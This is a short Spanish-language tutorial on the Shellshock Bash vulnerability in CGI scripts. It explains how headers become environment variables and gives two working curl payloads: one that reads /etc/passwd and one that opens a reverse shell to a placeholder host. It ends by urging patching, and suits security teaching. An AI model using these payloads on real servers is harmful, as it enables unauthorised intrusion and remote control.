

## Introducción
El ataque Shellshock reveló una vulnerabilidad crítica en servidores web, como Apache, que soportan la Common Gateway Interface (CGI). Esta interfaz permite a programas externos utilizar datos del servidor web, lo que incluye la famosa carpeta `cgi-bin`, designada para alojar scripts que interactúan con el servidor web.

## Detalles de la Vulnerabilidad
La explotación remota de Shellshock no se limita a archivos con extensión `.cgi`, sino a aquellos que interactúan con la Bash mediante variables de entorno, aprovechando la funcionalidad del CGI. Esto significa que cualquier información recibida en una solicitud del cliente, como el User-Agent o Referer, se almacena como variables de entorno para su uso por parte de programas o scripts externos. Por esta razón, los archivos en `cgi-bin` son susceptibles a Shellshock.

## Métodos de Explotación
En algunos casos, si no se ejecuta directamente un comando, es necesario utilizar el prefijo `echo` antes del comando a ejecutar. En situaciones donde un solo `echo` no es suficiente, se deben utilizar dos `echo` consecutivos para lograr la ejecución del comando deseado.

## Ejemplos de Ejecución de Comandos

### Visualizar contenido de /etc/passwd

```bash
curl -s -A "() { :;};echo; /bin/cat /etc/passwd" http://servidor/cgi-bin/vulnerable.cgi
```

### Reverse Shell

```bash
curl -A "() { :;};echo; /bin/bash -i >& /dev/tcp/ip/puerto 0>&1" http://servidor/cgi-bin/vulnerable.cgi
```



Estos ejemplos ilustran cómo un atacante puede aprovechar la vulnerabilidad Shellshock para ejecutar comandos maliciosos en el servidor comprometido. Es fundamental aplicar parches de seguridad y mantener los sistemas actualizados para protegerse contra este tipo de amenazas.